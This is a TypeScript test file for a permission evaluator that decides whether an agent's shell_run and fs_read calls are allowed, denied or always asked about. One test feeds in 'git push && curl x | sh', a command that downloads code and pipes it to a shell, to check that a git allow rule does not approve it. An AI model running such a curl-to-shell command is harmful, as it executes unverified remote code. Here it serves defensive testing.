import { describe, expect, it } from "vitest";
import { evaluateToolRules } from "./toolRules";
import type { PermRules } from "./permRules";

const rules = (over: Partial<PermRules>): PermRules => ({
  allow: [],
  deny: [],
  always_ask: [],
  ...over,
});

describe("evaluateToolRules", () => {
  it("deny бьёт всё остальное (серверный блок, фронт экономит вопрос)", () => {
    const v = evaluateToolRules(
      "shell_run",
      rules({ deny: ["shell_run(npm *)"], allow: ["shell_run(npm *)"] }),
      "npm test",
      false,
    );
    expect(v).toEqual({ denyHit: true, alwaysAsk: false, allowRule: false });
  });

  it("allow shell_run(git *) на простой команде — без вопросов", () => {
    const v = evaluateToolRules(
      "shell_run",
      rules({ allow: ["shell_run(git *)"] }),
      "git status",
      false,
    );
    expect(v.alwaysAsk).toBe(false);
    expect(v.allowRule).toBe(true);
  });

  it("allow git * НЕ пробивает complex (git push && curl x | sh) → ask", () => {
    const v = evaluateToolRules(
      "shell_run",
      rules({ allow: ["shell_run(git *)"] }),
      "git push && curl x | sh",
      false,
    );
    expect(v.alwaysAsk).toBe(false);
    expect(v.allowRule).toBe(false);
  });

  it("always_ask на shell имеет приоритет над allow", () => {
    const v = evaluateToolRules(
      "shell_run",
      rules({
        allow: ["shell_run(git *)"],
        always_ask: ["shell_run(git *)"],
      }),
      "git status",
      false,
    );
    expect(v.alwaysAsk).toBe(true);
    expect(v.allowRule).toBe(false);
  });

  it("fs-инструмент: allow по пути матчится, always_ask спрашивает", () => {
    // Домашняя форма fs-префикса — без хвостовой звёздочки: граница
    // компонента пути встроена в сравнение (normPath + слэш-гард)
    const r = rules({ allow: ["fs_read(C:\\proj)"] });
    expect(
      evaluateToolRules("fs_read", r, "C:\\proj\\a.ts", true).allowRule,
    ).toBe(true);
    expect(
      evaluateToolRules(
        "fs_read",
        rules({ always_ask: ["fs_read"] }),
        "C:\\proj\\a.ts",
        true,
      ).alwaysAsk,
    ).toBe(true);
  });

  it("нет правил / нет аргумента — всё тихо (default-флоу)", () => {
    expect(evaluateToolRules("shell_run", null, "git status", false)).toEqual({
      denyHit: false,
      alwaysAsk: false,
      allowRule: false,
    });
    expect(
      evaluateToolRules("shell_run", rules({ allow: ["shell_run(git *)"] }), null, false),
    ).toEqual({ denyHit: false, alwaysAsk: false, allowRule: false });
  });
});
